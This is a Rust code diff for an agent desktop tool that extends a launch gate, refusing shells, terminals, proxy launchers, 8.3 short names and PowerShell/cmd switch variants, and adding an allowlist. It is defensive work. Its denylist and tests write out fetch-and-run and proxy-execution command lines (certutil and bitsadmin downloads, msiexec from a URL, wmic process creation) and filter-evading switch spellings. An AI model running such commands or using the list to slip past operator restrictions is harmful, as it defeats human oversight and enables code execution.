@@ -27,19 +27,68 @@ use tokio::process::{Child, ChildStdin, ChildStdout, Command};
 use crate::error::{GhostError, Result};
 use crate::session::GhostSession;
 
-/// With `GHOST_SHELL=off`, the launch verbs refuse a command line that would
-/// hand the agent a shell anyway. Pure: no process is touched.
-pub fn launch_allowed_with_shell_off(cmdline: &str) -> std::result::Result<(), String> {
-    let refuse = |why: &str| {
-        Err(format!(
-            "GHOST_SHELL=off refuses this launch: {why}. Launching a command interpreter or script host would run commands the operator turned off. Plain applications still launch (for example 'notepad' or 'notepad C:\\x.txt')."
-        ))
-    };
-    let line = cmdline.trim();
-    if line.is_empty() {
-        return refuse("the command line is empty");
-    }
-    let (program, args) = match line.strip_prefix('"') {
+/// Programs that ARE a command interpreter, script host or shell. Refused as
+/// the program, and also when named as an argument (a proxy launcher we do not
+/// know about, `foo.exe cmd /c x`, still hands the agent one of these).
+const INTERPRETERS: &[&str] = &[
+    "cmd", "command",                         // Windows command processors
+    "powershell", "powershell_ise", "pwsh",   // PowerShell 5 / ISE / 7
+    "wscript", "cscript", "mshta",            // Windows Script Host, HTML Applications
+    "wsl", "bash", "sh", "zsh", "fish", "dash", "ksh", "mksh", "tcsh", "csh", // POSIX shells (wsl runs one)
+    "busybox",                                // `busybox sh`, and every applet it carries
+    "py", "perl", "ruby", "php", "node", "deno", "bun", "lua", "tclsh", "wish", // script interpreters
+];
+
+/// Programs that open a terminal (which starts a shell) or start another
+/// program named in their arguments. Refused as the program only: the name
+/// alone is the risk, and as an argument they would be too common a word.
+const LAUNCHERS: &[&str] = &[
+    // Terminals: each starts an interactive shell.
+    "conhost", "wt", "windowsterminal",
+    "gnome-terminal", "konsole", "xterm", "uxterm", "x-terminal-emulator", "xfce4-terminal", "mate-terminal",
+    "lxterminal", "qterminal", "terminator", "tilix", "kitty", "alacritty", "wezterm", "foot", "urxvt", "rxvt",
+    // Windows proxy execution: each runs a command line or program it is given.
+    "rundll32", "regsvr32",   // run a DLL export / COM registration script
+    "wslg",                   // runs a Linux command
+    "wmic",                   // `process call create "<cmdline>"`
+    "explorer",               // opens any path through the shell, programs included
+    "pcalua",                 // Program Compatibility Assistant: `-a <program>`
+    "forfiles",               // `/c "<command>"` per file
+    "schtasks", "at",         // schedule an arbitrary command
+    "sc",                     // creates a service with an arbitrary binary path
+    "msiexec",                // installer packages run custom actions (also from URLs)
+    "mmc",                    // snap-ins / .msc files can run commands
+    "hh",                     // compiled HTML help runs script and shortcuts
+    "msbuild",                // project files carry inline tasks (C#)
+    "installutil", "regasm", "regsvcs", // run code in a .NET assembly
+    "cmstp",                  // connection-manager profiles run commands
+    "certutil", "bitsadmin",  // download (and bitsadmin can run) a program
+    "runas",                  // starts a program named in its arguments
+    "ssh",                    // a remote (or localhost) shell
+    "control",                // runs Control Panel items (DLLs)
+    "msdt",                   // troubleshooter packages run script
+    "odbcconf",               // `REGSVR` action loads a DLL
+    "scriptrunner",           // `-appvscript <program>`
+    // Linux launchers: each starts the program or file it is given.
+    "gtk-launch", "xdg-open", "gio", "kde-open", "kde-open5", "exo-open", // .desktop files, scripts by association
+    "env", "nohup", "setsid", "nice", "timeout", "stdbuf", "xargs", "flock", "chroot", "unshare", // exec their arguments
+    "sudo", "pkexec", "doas", "su", "systemd-run", // run a command (as another user)
+    "script", "expect", "watch",                    // run a shell / a command
+];
+
+/// Extensions that are not a program but run as one through an interpreter
+/// or the shell's file association.
+const SCRIPT_EXTS: &[&str] = &[
+    "bat", "cmd", "ps1", "psm1", "vbs", "vbe", "js", "jse", "wsf", "wsh", "hta", "msc", "lnk", "url", "scr", "pif",
+    "cpl", "msi", "inf", "desktop", "sh",
+];
+
+/// Extensions a program file may carry, stripped before the name is compared.
+const PROGRAM_EXTS: &[&str] = &["exe", "com"];
+
+/// Split a command line into its program (unquoted) and the rest.
+fn split_program(line: &str) -> (&str, &str) {
+    match line.strip_prefix('"') {
         Some(rest) => match rest.find('"') {
             Some(i) => (&rest[..i], rest[i + 1..].trim()),
             None => (rest, ""),
@@ -48,45 +97,227 @@ pub fn launch_allowed_with_shell_off(cmdline: &str) -> std::result::Result<(), S
             Some(i) => (&line[..i], line[i..].trim()),
             None => (line, ""),
         },
-    };
-    // Basename on either separator; Windows ignores trailing dots and spaces.
-    let base = program
+    }
+}
+
+/// (lowercase basename, stem, extension) of a path, on either separator.
+/// Windows ignores trailing dots and spaces; Debian's `.wrapper`/`.real`
+/// suffixes (x-terminal-emulator -> gnome-terminal.wrapper) are dropped.
+fn name_parts(path: &str) -> (String, String, String) {
+    let base = path
+        .trim_matches('"')
         .rsplit(['\\', '/'])
         .next()
-        .unwrap_or(program)
+        .unwrap_or(path)
         .trim_end_matches(['.', ' '])
         .to_ascii_lowercase();
-    let (stem, ext) = match base.rsplit_once('.') {
-        Some((s, e)) if matches!(e, "exe" | "com" | "bat" | "cmd" | "ps1" | "vbs" | "vbe" | "js" | "jse" | "wsf" | "wsh" | "hta" | "msc") => (s, e),
-        _ => (base.as_str(), ""),
+    let base = base.strip_suffix(".wrapper").or_else(|| base.strip_suffix(".real")).unwrap_or(&base).to_string();
+    match base.rsplit_once('.') {
+        Some((s, e)) if PROGRAM_EXTS.contains(&e) || SCRIPT_EXTS.contains(&e) => (base.clone(), s.to_string(), e.to_string()),
+        _ => (base.clone(), base, String::new()),
+    }
+}
+
+/// python, python3, python3.11, pythonw
+fn is_python(stem: &str) -> bool {
+    stem.strip_prefix("python")
+        .is_some_and(|r| r.trim_start_matches('w').chars().all(|c| c.is_ascii_digit() || c == '.'))
+}
+
+/// Whether an argument is a PowerShell `-Command` / `-EncodedCommand` /
+/// `-CommandWithArgs` (or, `strict`, `-File`) switch in any spelling the
+/// PowerShell parser accepts: any unambiguous prefix, led by `-`, `--`, `/`
+/// or a Unicode dash, optionally `:value`.
+fn is_ps_script_switch(tok: &str, strict: bool) -> bool {
+    let t = tok.to_lowercase();
+    let mut chars = t.chars();
+    let Some(first) = chars.next() else { return false };
+    if !matches!(first, '-' | '/' | '\u{2013}' | '\u{2014}' | '\u{2015}') {
+        return false;
+    }
+    let mut rest = chars.as_str();
+    if first != '/' {
+        rest = rest.strip_prefix(['-', '\u{2013}', '\u{2014}', '\u{2015}']).unwrap_or(rest);
+    }
+    let name = rest.split(':').next().unwrap_or("");
+    if name.is_empty() {
+        return false;
+    }
+    let prefix_of = |full: &str, min: usize| name.len() >= min && full.starts_with(name);
+    prefix_of("command", 1)
+        || prefix_of("commandwithargs", 1)
+        || name == "cwa"
+        || prefix_of("encodedcommand", 1)
+        || name == "ec"
+        || (strict && prefix_of("file", 2))
+}
+
+/// Whether an argument is a `cmd` run switch: `/c`, `/k`, `/r` in any case,
+/// or (`strict`) glued to its command (`/ccalc`).
+fn is_cmd_switch(tok: &str, strict: bool) -> bool {
+    let t = tok.to_ascii_lowercase();
+    let Some(rest) = t.strip_prefix('/') else { return false };
+    let mut c = rest.chars();
+    match c.next() {
+        Some('c' | 'k' | 'r') => c.as_str().is_empty() || strict,
+        _ => false,
+    }
+}
+
+/// Whether the text names an 8.3 short name (`POWERS~1.EXE`, `WINDOW~1`).
+fn has_short_name(path: &str) -> bool {
+    path.split(['\\', '/']).any(|part| {
+        part.find('~').is_some_and(|i| part[i + 1..].starts_with(|c: char| c.is_ascii_digit()))
+    })
+}
+
+/// `GHOST_LAUNCH_ALLOW`: comma-separated basenames (`notepad`) or full paths
+/// (`C:\Tools\viewer.exe`). None when unset or blank.
+pub fn parse_launch_allow(value: Option<&str>) -> Option<Vec<String>> {
+    let list: Vec<String> = value?
+        .split(',')
+        .map(|e| e.trim().trim_matches('"').trim().to_lowercase())
+        .filter(|e| !e.is_empty())
+        .collect();
+    (!list.is_empty()).then_some(list)
+}
+
+/// Whether `program` (as typed, and as resolved when it resolved) is on the
+/// allowlist. A path entry must equal the program's full path; a basename
+/// entry matches the program's name with or without `.exe`.
+fn allowlisted(allow: &[String], program: &str, resolved: Option<&str>) -> bool {
+    let norm = |p: &str| p.trim_matches('"').replace('/', "\\").to_lowercase();
+    let full = norm(resolved.unwrap_or(program));
+    let (_, stem, ext) = name_parts(resolved.unwrap_or(program));
+    allow.iter().any(|entry| {
+        if entry.contains(['\\', '/']) {
+            norm(entry) == full
+        } else {
+            let (_, e_stem, _) = name_parts(entry);
+            e_stem == stem && (ext.is_empty() || PROGRAM_EXTS.contains(&ext.as_str()))
+        }
+    })
+}
+
+/// With `GHOST_SHELL=off`, the launch verbs refuse a command line that would
+/// hand the agent a shell anyway. Pure: no process is touched.
+///
+/// The program is judged by the name as typed AND by the name `resolve`
+/// returns for it (the long path on Windows, so an 8.3 alias such as
+/// `POWERS~1.EXE` cannot hide `powershell`; the symlink target on Linux). A
+/// program that does not resolve is judged by its typed name, under stricter
+/// argument rules (glued `cmd` switches, `-File`), and refused outright when
+/// it is written with an 8.3 alias.
+///
+/// This is a denylist and cannot be complete. `allow` (`GHOST_LAUNCH_ALLOW`)
+/// is the strict option: when given, only the listed programs launch.
+pub fn launch_allowed_with_shell_off(
+    cmdline: &str,
+    allow: Option<&[String]>,
+    resolve: &dyn Fn(&str) -> Option<String>,
+) -> std::result::Result<(), String> {
+    let refuse = |why: &str| {
+        Err(format!(
+            "GHOST_SHELL=off refuses this launch: {why}. Launching a command interpreter, terminal, script host or a program that starts other programs would run commands the operator turned off. Plain applications still launch (for example 'notepad' or 'notepad C:\\x.txt'); the operator can list exactly which programs may launch with GHOST_LAUNCH_ALLOW."
+        ))
     };
-    if matches!(ext, "bat" | "cmd" | "ps1" | "vbs" | "vbe" | "js" | "jse" | "wsf" | "wsh" | "hta") {
-        return refuse(&format!("'{base}' is a script file"));
+    let line = cmdline.trim();
+    if line.is_empty() {
+        return refuse("the command line is empty");
     }
-    const HOSTS: &[&str] = &[
-        "cmd", "command", "conhost", "powershell", "powershell_ise", "pwsh", "wscript", "cscript", "mshta",
-        "rundll32", "regsvr32", "wsl", "wslg", "bash", "sh", "zsh", "wt", "windowsterminal",
-        "py", "perl", "ruby", "php", "node", "deno", "bun",
-    ];
-    // python, python3, python3.11, pythonw
-    let python = stem.strip_prefix("python").is_some_and(|r| r.trim_start_matches('w').chars().all(|c| c.is_ascii_digit() || c == '.'));
-    if python || HOSTS.contains(&stem) {
-        return refuse(&format!("'{stem}' is a command interpreter or script host"));
+    let (program, args) = split_program(line);
+    let resolved = resolve(program);
+
+    if let Some(allow) = allow {
+        if !allowlisted(allow, program, resolved.as_deref()) {
+            let shown = resolved.as_deref().unwrap_or(program);
+            return Err(format!(
+                "GHOST_SHELL=off with GHOST_LAUNCH_ALLOW set launches only the listed programs; '{shown}' is not one of them."
+            ));
+        }
+    } else {
+        for name in std::iter::once(program).chain(resolved.as_deref()) {
+            let (base, stem, ext) = name_parts(name);
+            if SCRIPT_EXTS.contains(&ext.as_str()) {
+                return refuse(&format!("'{base}' is a script or shortcut file"));
+            }
+            if is_python(&stem) || INTERPRETERS.contains(&stem.as_str()) {
+                return refuse(&format!("'{stem}' is a command interpreter or script host"));
+            }
+            if LAUNCHERS.contains(&stem.as_str()) {
+                return refuse(&format!("'{stem}' is a terminal or starts other programs"));
+            }
+        }
+        if resolved.is_none() && has_short_name(program) {
+            return refuse(&format!("'{program}' is an 8.3 short name that could not be resolved to its real name"));
+        }
     }
+
+    let strict = resolved.is_none();
     for tok in args.split_whitespace() {
-        let t = tok.trim_matches('"').to_ascii_lowercase();
-        if matches!(t.as_str(), "-c" | "-e" | "-ec" | "-enc" | "-command" | "-encodedcommand" | "/c" | "/k" | "/command") {
+        let t = tok.trim_matches(['"', '\'']);
+        if is_ps_script_switch(t, strict) || is_cmd_switch(t, strict) {
             return refuse(&format!("the argument '{tok}' looks like inline script"));
+        }
+        if !t.contains("://") {
+            let (_, stem, _) = name_parts(t);
+            if is_python(&stem) || INTERPRETERS.contains(&stem.as_str()) {
+                return refuse(&format!("the argument '{tok}' names a command interpreter"));
+            }
         }
     }
     Ok(())
 }
 
+/// The program a command line names, resolved the way the launch verbs will
+/// find it: on Windows a bare name through `SearchPathW` (the CreateProcess
+/// search order, `.exe` appended), then every component expanded to its long
+/// name with `GetLongPathNameW`. None when it cannot be found.
+#[cfg(windows)]
+pub fn resolve_program(program: &str) -> Option<String> {
+    use windows::core::{HSTRING, PCWSTR};
+    use windows::Win32::Storage::FileSystem::{GetLongPathNameW, SearchPathW};
+    let p = program.trim().trim_matches('"');
+    if p.is_empty() {
+        return None;
+    }
+    let mut buf = vec![0u16; 1024];
+    let found = if p.contains(['\\', '/']) {
+        p.to_string()
+    } else {
+        let n = unsafe { SearchPathW(PCWSTR::null(), &HSTRING::from(p), &HSTRING::from(".exe"), Some(&mut buf), None) } as usize;
+        if n == 0 || n >= buf.len() {
+            return None;
+        }
+        String::from_utf16_lossy(&buf[..n])
+    };
+    let n = unsafe { GetLongPathNameW(&HSTRING::from(found.as_str()), Some(&mut buf)) } as usize;
+    (n > 0 && n < buf.len()).then(|| String::from_utf16_lossy(&buf[..n]))
+}
+
+/// Elsewhere: a bare name through `PATH`, then every symlink followed
+/// (`/usr/bin/x-terminal-emulator` -> `gnome-terminal.wrapper`).
+#[cfg(not(windows))]
+pub fn resolve_program(program: &str) -> Option<String> {
+    let p = program.trim().trim_matches('"');
+    if p.is_empty() {
+        return None;
+    }
+    let path = if p.contains('/') {
+        std::path::PathBuf::from(p)
+    } else {
+        std::env::split_paths(&std::env::var_os("PATH")?).map(|d| d.join(p)).find(|c| c.is_file())?
+    };
+    std::fs::canonicalize(path).ok().map(|c| c.to_string_lossy().into_owned())
+}
+
 /// Gate for every launch verb: when `GHOST_SHELL` is off, refuse command lines
-/// that would start a shell by another route.
+/// that would start a shell by another route, and when `GHOST_LAUNCH_ALLOW`
+/// is set, anything it does not list.
 pub(crate) fn ensure_launch_allowed(cmdline: &str) -> Result<()> {
     if shell_disabled() {
-        launch_allowed_with_shell_off(cmdline).map_err(GhostError::Config)?;
+        let allow = parse_launch_allow(std::env::var("GHOST_LAUNCH_ALLOW").ok().as_deref());
+        launch_allowed_with_shell_off(cmdline, allow.as_deref(), &resolve_program).map_err(GhostError::Config)?;
     }
     Ok(())
 }
@@ -1506,6 +1737,10 @@ mod tests {
         }
     }
 
+    fn no_resolve(_: &str) -> Option<String> {
+        None
+    }
+
     #[test]
     fn launch_gate_refuses_interpreters_and_inline_script() {
         let refused = [
@@ -1517,7 +1752,7 @@ mod tests {
             r#""C:\Program Files\PowerShell\7\pwsh.exe""#,
         ];
         for c in refused {
-            let e = launch_allowed_with_shell_off(c).expect_err(c);
+            let e = launch_allowed_with_shell_off(c, None, &no_resolve).expect_err(c);
             assert!(e.contains("GHOST_SHELL=off"), "{c}: {e}");
         }
     }
@@ -1526,13 +1761,13 @@ mod tests {
     fn launch_gate_allows_plain_apps() {
         for c in ["notepad", "notepad.exe", r"notepad C:\x.txt", r#""C:\Program Files\App\app.exe" --flag"#,
                   "calc", "mspaint.exe /pt", r#"notepad "C:\a b\cmd.txt""#, "msedge --new-window"] {
-            assert!(launch_allowed_with_shell_off(c).is_ok(), "{c}");
+            assert!(launch_allowed_with_shell_off(c, None, &no_resolve).is_ok(), "{c}");
         }
     }
 
     #[test]
     fn launch_gate_empty_is_refused() {
-        assert!(launch_allowed_with_shell_off("  ").is_err());
+        assert!(launch_allowed_with_shell_off("  ", None, &no_resolve).is_err());
     }
 
     #[test]
@@ -1543,6 +1778,205 @@ mod tests {
         assert!(shell_disabled());
         std::env::remove_var("GHOST_SHELL");
         assert!(!shell_disabled());
+    }
+}
+
+#[cfg(test)]
+mod launch_gate_tests {
+    use super::*;
+
+    fn no_resolve(_: &str) -> Option<String> {
+        None
+    }
+
+    fn gate(c: &str) -> std::result::Result<(), String> {
+        launch_allowed_with_shell_off(c, None, &no_resolve)
+    }
+
+    #[test]
+    fn short_names_resolve_to_the_long_program_name() {
+        // 8.3 names hide the basename from a text check; the resolver gives
+        // the long path, as GetLongPathNameW does.
+        let resolve = |p: &str| {
+            p.to_ascii_uppercase()
+                .contains("POWERS~1")
+                .then(|| r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe".to_string())
+        };
+        let c = r#"C:\WINDOWS\system32\WINDOW~1\v1.0\POWERS~1.EXE Get-Date"#;
+        let e = launch_allowed_with_shell_off(c, None, &resolve).expect_err(c);
+        assert!(e.contains("powershell"), "{e}");
+    }
+
+    #[test]
+    fn unresolvable_short_names_are_refused() {
+        let c = r#"C:\WINDOWS\system32\WINDOW~1\v1.0\POWERS~1.EXE Get-Date"#;
+        assert!(gate(c).is_err(), "{c}");
+    }
+
+    #[test]
+    fn powershell_flag_prefixes_are_refused() {
+        for flag in [
+            "-co", "-comm", "-command", "-en", "-encodedc", "-e", "-ec", "/c", "/co", "/encodedcommand",
+            "\u{2013}co", "\u{2014}command", "--command", "-cwa", "-commandwithargs", "-fi", "-file", "/file",
+            "-CO", "-EnC",
+        ] {
+            let c = format!("tool {flag} x");
+            assert!(gate(&c).is_err(), "{c}");
+        }
+    }
+
+    #[test]
+    fn cmd_switches_are_refused_in_any_case_and_glued() {
+        for c in ["cmd /r calc", "tool /R x", "tool /K x", "tool /ccalc", "tool /kdir", "tool /Rcalc"] {
+            assert!(gate(c).is_err(), "{c}");
+        }
+    }
+
+    #[test]
+    fn proxy_launchers_are_refused() {
+        for c in [
+            r#"wmic process call create "cmd /r calc""#,
+            r"explorer.exe C:\Windows\System32\cmd.exe",
+            "pcalua -a cmd.exe",
+            r#"forfiles /p C:\Windows /m win.ini /c "calc""#,
+            "schtasks /create /tn x /tr calc /sc once /st 00:00",
+            "msiexec /i http://x/y.msi",
+            "mmc x.msc",
+            "hh.exe x.chm",
+            "msbuild x.proj",
+            "installutil x.dll",
+            "cmstp /s x.inf",
+            "certutil -urlcache -f http://x/y y.exe",
+            r"bitsadmin /transfer x http://x/y C:\y.exe",
+            r"runas /user:x notepad",
+            "ssh localhost",
+            "pcalua.exe -a notepad",
+        ] {
+            assert!(gate(c).is_err(), "{c}");
+        }
+    }
+
+    #[test]
+    fn linux_terminals_shells_and_wrappers_are_refused() {
+        for c in [
+            "gnome-terminal", "konsole", "xterm", "x-terminal-emulator", "fish", "dash", "ksh", "tcsh",
+            "gtk-launch evil", "xdg-open /tmp/x.desktop", "xdg-open /tmp/x.sh", "env calc", "nohup calc",
+            "setsid calc", "busybox sh", "/usr/bin/env FOO=1 calc", "/bin/dash",
+        ] {
+            assert!(gate(c).is_err(), "{c}");
+        }
+    }
+
+    #[test]
+    fn symlinked_names_are_judged_by_their_target_too() {
+        // /usr/bin/x-terminal-emulator -> gnome-terminal.wrapper, /bin/sh -> dash.
+        let resolve = |p: &str| match p {
+            "termapp" => Some("/usr/bin/gnome-terminal.wrapper".to_string()),
+            "/usr/local/bin/myshell" => Some("/usr/bin/dash".to_string()),
+            _ => None,
+        };
+        for c in ["termapp", "/usr/local/bin/myshell"] {
+            assert!(launch_allowed_with_shell_off(c, None, &resolve).is_err(), "{c}");
+        }
+    }
+
+    #[test]
+    fn plain_applications_still_launch() {
+        let resolve = |p: &str| match p.to_ascii_lowercase().as_str() {
+            "notepad" => Some(r"C:\Windows\System32\notepad.exe".to_string()),
+            "mspaint" => Some(r"C:\Windows\System32\mspaint.exe".to_string()),
+            _ => None,
+        };
+        for c in ["notepad", r"notepad C:\x.txt", "mspaint", r#""C:\Program Files\App\app.exe" --profile x"#,
+                  "msedge https://example.com/bash", r#"notepad "C:\a b\cmd.txt""#] {
+            assert!(launch_allowed_with_shell_off(c, None, &resolve).is_ok(), "{c}");
+            assert!(gate(c).is_ok(), "{c} (unresolved)");
+        }
+    }
+
+    #[test]
+    fn allowlist_admits_only_listed_programs() {
+        let allow = parse_launch_allow(Some(r" notepad , C:\Tools\viewer.exe ,,")).expect("allowlist");
+        let resolve = |p: &str| match p.to_ascii_lowercase().as_str() {
+            "notepad" | "notepad.exe" => Some(r"C:\Windows\System32\notepad.exe".to_string()),
+            _ => None,
+        };
+        let ok = |c: &str| launch_allowed_with_shell_off(c, Some(&allow), &resolve);
+        for c in ["notepad", r"notepad C:\x.txt", "NOTEPAD.EXE", r"C:\Tools\viewer.exe", r#""c:\tools\VIEWER.exe" a.png"#] {
+            assert!(ok(c).is_ok(), "{c}: {:?}", ok(c));
+        }
+        for c in ["mspaint", "calc", r"C:\Other\viewer.exe", r"C:\Tools\viewer2.exe", "cmd /c x", "notepad -command x"] {
+            let e = ok(c).expect_err(c);
+            assert!(e.contains("GHOST_LAUNCH_ALLOW") || e.contains("inline script"), "{c}: {e}");
+        }
+        assert!(ok("mspaint").unwrap_err().contains("GHOST_LAUNCH_ALLOW"));
+    }
+
+    /// The body of `fn_sig` in `src`, up to the end of the function.
+    fn body<'a>(src: &'a str, fn_sig: &str) -> &'a str {
+        let start = src.find(fn_sig).unwrap_or_else(|| panic!("{fn_sig} not found"));
+        &src[start..start + src[start..].find("\n    }").expect("end of fn")]
+    }
+
+    fn gate_before(src: &str, fn_sig: &str, spawn: &str) {
+        let b = body(src, fn_sig);
+        let gate = b.find("ensure_launch_allowed(").unwrap_or_else(|| panic!("no launch gate in {fn_sig}"));
+        let spawn_at = b.find(spawn).unwrap_or_else(|| panic!("no '{spawn}' in {fn_sig}"));
+        assert!(gate < spawn_at, "the launch gate must come before the spawn in {fn_sig}:\n{b}");
+    }
+
+    #[test]
+    fn every_launch_verb_checks_the_gate_before_spawning() {
+        gate_before(include_str!("session.rs"), "pub async fn launch(&self", "proc_launch(");
+        gate_before(include_str!("hidden.rs"), "pub async fn launch_hidden(", "d.launch(");
+        gate_before(include_str!("registries.rs"), "pub async fn desktop_launch(", ".launch(command)");
+    }
+
+    #[test]
+    fn the_gate_uses_the_real_resolver_and_the_allowlist() {
+        let b = body(include_str!("shell.rs"), "pub(crate) fn ensure_launch_allowed(");
+        assert!(b.contains("&resolve_program"), "{b}");
+        assert!(b.contains("GHOST_LAUNCH_ALLOW"), "{b}");
+    }
+
+    #[test]
+    fn allowlist_unset_or_blank_is_none() {
+        for v in [None, Some(""), Some(" , ,")] {
+            assert!(parse_launch_allow(v).is_none(), "{v:?}");
+        }
+    }
+
+    #[cfg(windows)]
+    #[test]
+    fn windows_resolver_finds_system_programs_by_bare_name() {
+        // Reads the file system only: SearchPathW plus GetLongPathNameW.
+        let p = resolve_program("notepad").expect("notepad resolves");
+        assert!(p.to_ascii_lowercase().ends_with(r"\notepad.exe"), "{p}");
+        assert!(resolve_program("ghost-no-such-program-xyzzy").is_none());
+    }
+
+    #[cfg(windows)]
+    #[test]
+    fn windows_resolver_expands_a_real_short_path() {
+        use windows::core::HSTRING;
+        use windows::Win32::Storage::FileSystem::GetShortPathNameW;
+        let dir = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".into());
+        let long = format!(r"{dir}\System32\WindowsPowerShell\v1.0\powershell.exe");
+        let mut buf = [0u16; 520];
+        let n = unsafe { GetShortPathNameW(&HSTRING::from(long.as_str()), Some(&mut buf)) } as usize;
+        if n == 0 || n >= buf.len() {
+            eprintln!("SKIP: no short name available");
+            return;
+        }
+        let short = String::from_utf16_lossy(&buf[..n]);
+        if !short.contains('~') {
+            eprintln!("SKIP: 8.3 names are disabled on this volume ({short})");
+            return;
+        }
+        let resolved = resolve_program(&short).expect("short path resolves");
+        assert!(resolved.to_ascii_lowercase().ends_with(r"\powershell.exe"), "{short} -> {resolved}");
+        let e = launch_allowed_with_shell_off(&format!("{short} Get-Date"), None, &resolve_program).expect_err(&short);
+        assert!(e.contains("powershell"), "{e}");
     }
 }
 
